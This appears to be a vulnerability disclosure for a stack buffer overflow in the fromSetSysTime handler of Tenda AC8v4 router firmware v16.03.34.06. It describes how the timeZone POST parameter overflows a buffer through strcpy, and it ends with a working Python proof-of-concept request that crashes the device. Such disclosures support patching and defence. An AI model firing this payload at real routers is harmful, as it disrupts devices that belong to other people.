# Tenda AC8v4 v16.03.34.06 fromSetSysTime

## Overview

- Manufacturer's website information：https://www.tenda.com.cn/

- Firmware download website: https://www.tenda.com.cn/material/show/103518

## Affected version

AC8v4 v16.03.34.06

## Vulnerability details

The Tenda AC8v4 V16.03.34.06 firmware has a stack overflow vulnerability in the `fromSetSysTime` function. The `v3` variable receives the `timeType` parameter from a POST request and we let `v3=="sync"` to execute function `sub_4A75C0`. 

![1735745539949](F:\Desktop\工具\二进制漏洞\IoT\img\1735745539949.png)

The `s` variable receives the `timeZone` parameter from a POST request. However, since the user can control the input of `timeZone`, the statement `strcpy((char *)v6, s);` can cause a buffer overflow. The user-provided  `timeZone` can exceed the capacity of the `v6` array, triggering this security vulnerability.

![1735745606521](F:\Desktop\工具\二进制漏洞\IoT\img\1735745606521.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.1.100"
url = "http://" + ip + "/goform/SetSysTimeCfg"
payload = b"a"*1000

data = {
        'timeType':'sync',
        'timeZone':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![1735745816017](F:\Desktop\工具\二进制漏洞\IoT\img\1735745816017.png)